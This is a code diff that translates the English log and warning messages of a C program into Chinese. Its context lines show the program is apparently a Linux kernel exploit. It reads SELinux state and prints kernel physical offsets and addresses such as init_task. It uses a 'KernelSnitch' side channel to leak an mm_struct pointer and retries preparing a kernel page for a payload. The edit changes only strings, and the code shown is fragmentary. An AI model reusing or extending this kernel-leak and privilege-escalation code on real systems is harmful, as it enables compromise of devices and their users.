@@ -65,7 +65,7 @@ void read_first_line(const char *path, char *buf, size_t len) {
   if (!len) {
     return;
   }
-  snprintf(buf, len, "unreadable");
+  snprintf(buf, len, "不可读");
   int fd = open(path, O_RDONLY | O_CLOEXEC);
   if (fd < 0) {
     return;
@@ -75,7 +75,7 @@ void read_first_line(const char *path, char *buf, size_t len) {
   close(fd);
   if (n <= 0) {
     errno = saved_errno;
-    snprintf(buf, len, "unreadable");
+    snprintf(buf, len, "不可读");
     return;
   }
   buf[n] = 0;
@@ -116,13 +116,13 @@ void log_startup_context(void) {
                "Seccomp_filters=%s", values[0], values[1], values[2]);
     }
   }
-  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
+  pr_success("启动上下文 pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
              getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
              enforce);
-  pr_success("startup limits pid=%d %s\n", getpid(), limits);
-  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
+  pr_success("启动限制 pid=%d %s\n", getpid(), limits);
+  pr_success("构建配置 pid=%d label=%s slide=pselect main=pselect\n",
              getpid(), BUILD_VARIANT_LABEL);
-  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
+  pr_success("p0配置文件 pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
@@ -140,7 +140,7 @@ void log_slide_child_context(void) {
   char enforce[32];
   read_first_line("/proc/self/attr/current", attr, sizeof(attr));
   read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
-  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
+  pr_success("slide子进程上下文 route=%s pid=%d uid=%u euid=%u gid=%u "
              "egid=%u attr=%s enforce=%s\n",
              "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
              attr, enforce);
@@ -588,7 +588,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   SYSCHK(waitpid(child_leak, NULL, 0));
 
   if (!kernelsnitch_found_collisions(ks)) {
-    pr_warning("KernelSnitch collision finding failed\n");
+    pr_warning("KernelSnitch冲突查找失败\n");
     kernelsnitch_cleanup(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
@@ -601,7 +601,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   kernelsnitch_bruteforce(ks);
   uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
-    pr_warning("KernelSnitch mm_struct leak failed\n");
+    pr_warning("KernelSnitch mm_struct泄露失败\n");
     kernelsnitch_cleanup(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
@@ -701,10 +701,10 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
     if (base) {
       return base;
     }
-    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
+    pr_warning("prepare_kernel_page重试 %d/%d\n", attempt,
                max_attempts);
   }
-  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
+  pr_warning("prepare_kernel_page未找到可用的非零源指针\n");
   return 0;
 }
 
